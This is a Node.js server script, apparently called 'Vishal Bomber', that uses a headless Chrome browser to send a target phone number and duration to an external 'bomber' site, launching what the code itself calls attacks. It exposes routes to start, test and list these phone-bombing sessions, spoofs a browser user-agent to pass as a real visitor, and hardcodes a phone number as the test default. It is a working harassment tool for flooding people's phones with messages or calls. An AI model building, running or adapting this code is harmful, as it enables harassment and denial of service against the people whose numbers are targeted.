// ============================================================
// bomber_server.js - Vishal Bomber (Real Chrome via Puppeteer)
// ============================================================

const express = require('express');
const puppeteer = require('puppeteer');  // 🔥 REAL BROWSER
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// ============================================================
// 🔥 CONFIGURATION
// ============================================================

const MAX_DURATION_MIN = 3;
const MAX_CONCURRENT_ATTACKS = 2;
const VISHAL_BOMBER_URL = 'https://vishal.lovestoblog.com/bomber4.php';

// ============================================================
// 🔄 ACTIVE ATTACKS
// ============================================================

const activeAttacks = new Map();
let attackCounter = 0;
let browser = null;  // 🔥 Global browser instance

// ============================================================
// 📊 LOGGER
// ============================================================

function log(level, msg) {
    const time = new Date().toISOString();
    const emoji = {
        info: 'ℹ️ ',
        success: '✅',
        fail: '❌',
        warn: '⚠️ ',
        error: '🔥'
    }[level] || 'ℹ️ ';
    console.log(`${emoji} [${time}] ${msg}`);
}

// ============================================================
// 🌐 BROWSER LAUNCH
// ============================================================

async function getBrowser() {
    if (!browser) {
        log('info', '🌐 Launching headless Chrome...');
        browser = await puppeteer.launch({
            headless: 'new',  // New headless mode (Chrome jaisa)
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--single-process',
                '--no-zygote'
            ]
        });
        log('success', '✅ Headless Chrome launched');
    }
    return browser;
}

// ============================================================
// 🎯 VISHAL BOMBER CALL — REAL CHROME
// ============================================================

async function callVishalBomber(phone, duration, attackId) {
    const url = `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`;
    
    log('info', `🚀 ATTACK #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);
    log('info', `🔗 URL: ${url}`);

    let page = null;

    try {
        const b = await getBrowser();
        page = await b.newPage();

        // 🔥 Chrome jaisa user-agent set karo
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36');

        // 🔥 Real Chrome ki tarah URL kholo
        log('info', `🌐 Opening URL in real Chrome...`);
        
        const response = await page.goto(url, {
            waitUntil: 'networkidle2',  // Network idle hone tak wait karo
            timeout: 60000  // 60s timeout
        });

        const status = response ? response.status() : 'NO_RESPONSE';
        log('success', `✅ ATTACK #${attackId} RESPONSE | Status: ${status} | Phone: ${phone}`);

        // 🔥 Page ka content check karo
        const bodyText = await page.evaluate(() => document.body.innerText);
        log('info', `📄 Page content: ${bodyText.substring(0, 200)}`);

        // 🔥 Thoda wait karo (Vishal Bomber ko time do)
        await new Promise(r => setTimeout(r, 5000));

        return {
            success: true,
            status: status,
            attackId,
            phone,
            duration
        };
    } catch (err) {
        log('fail', `❌ ATTACK #${attackId} FAILED | Phone: ${phone} | Error: ${err.message}`);
        return {
            success: false,
            status: null,
            attackId,
            phone,
            duration,
            error: err.message
        };
    } finally {
        if (page) {
            await page.close().catch(() => {});
        }
    }
}

// ============================================================
// 🎯 BOMBING SESSION
// ============================================================

async function runAttackSession(phone, duration, attackId) {
    const startTime = Date.now();
    
    log('info', `⚔️  SESSION #${attackId} START | Phone: ${phone} | Duration: ${duration}min`);

    const result = await callVishalBomber(phone, duration, attackId);

    if (result.success) {
        log('success', `✅ SESSION #${attackId} COMPLETE`);
    } else {
        log('fail', `❌ SESSION #${attackId} FAILED`);
    }

    activeAttacks.delete(phone);
    
    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
    log('info', `🏁 SESSION #${attackId} END | Time: ${elapsed}s`);
}

// ============================================================
// 🛣️  ROUTES
// ============================================================

app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        server: 'Vishal Bomber (Real Chrome)',
        max_duration_min: MAX_DURATION_MIN,
        max_concurrent: MAX_CONCURRENT_ATTACKS,
        active_attacks: activeAttacks.size,
        vishal_url: VISHAL_BOMBER_URL
    });
});

app.get('/health', (req, res) => {
    res.json({
        ready: true,
        active_attacks: activeAttacks.size,
        can_accept: activeAttacks.size < MAX_CONCURRENT_ATTACKS
    });
});

// 🔥 TEST ROUTE
app.get('/test-vishal', async (req, res) => {
    const phone = req.query.phone || '7777885694';
    const duration = req.query.duration || 1;
    
    log('info', `🧪 MANUAL TEST | Phone: ${phone} | Duration: ${duration}`);
    
    const result = await callVishalBomber(phone, duration, 'TEST');
    
    res.json({
        url: `${VISHAL_BOMBER_URL}?phone=${phone}&duration=${duration}`,
        result: result
    });
});

app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;

    if (!phone || phone.length !== 10) {
        return res.status(400).json({ success: false, error: 'Invalid phone' });
    }

    const requestedDuration = Number(duration) || 1;
    const effectiveDuration = Math.min(requestedDuration, MAX_DURATION_MIN);

    log('info', `📱 NEW REQUEST | Phone: ${phone} | Duration: ${effectiveDuration}min`);

    if (activeAttacks.has(phone)) {
        return res.json({
            success: false,
            phone,
            message: 'Attack already running'
        });
    }

    if (activeAttacks.size >= MAX_CONCURRENT_ATTACKS) {
        return res.status(429).json({
            success: false,
            phone,
            message: `Max ${MAX_CONCURRENT_ATTACKS} attacks allowed`,
            retry_after: 60
        });
    }

    attackCounter++;
    const attackId = `A${attackCounter}_${phone}`;

    activeAttacks.set(phone, {
        attackId,
        phone,
        duration: effectiveDuration,
        startTime: Date.now()
    });

    log('success', `✅ ATTACK #${attackId} STARTED`);

    runAttackSession(phone, effectiveDuration, attackId).catch(err => {
        log('error', `❌ ERROR: ${err.message}`);
        activeAttacks.delete(phone);
    });

    res.json({
        success: true,
        attack_id: attackId,
        phone,
        effective_duration: effectiveDuration,
        active_attacks: activeAttacks.size
    });
});

app.get('/attacks', (req, res) => {
    res.json({
        active_attacks: activeAttacks.size,
        attacks: Array.from(activeAttacks.values())
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    log('success', `🚀 Server running on port ${PORT}`);
    log('info', `🔗 Vishal URL: ${VISHAL_BOMBER_URL}`);
    log('info', `🌐 Mode: REAL CHROME (Puppeteer)`);
    log('info', `🧪 Test: /test-vishal?phone=7777885694&duration=1`);
});
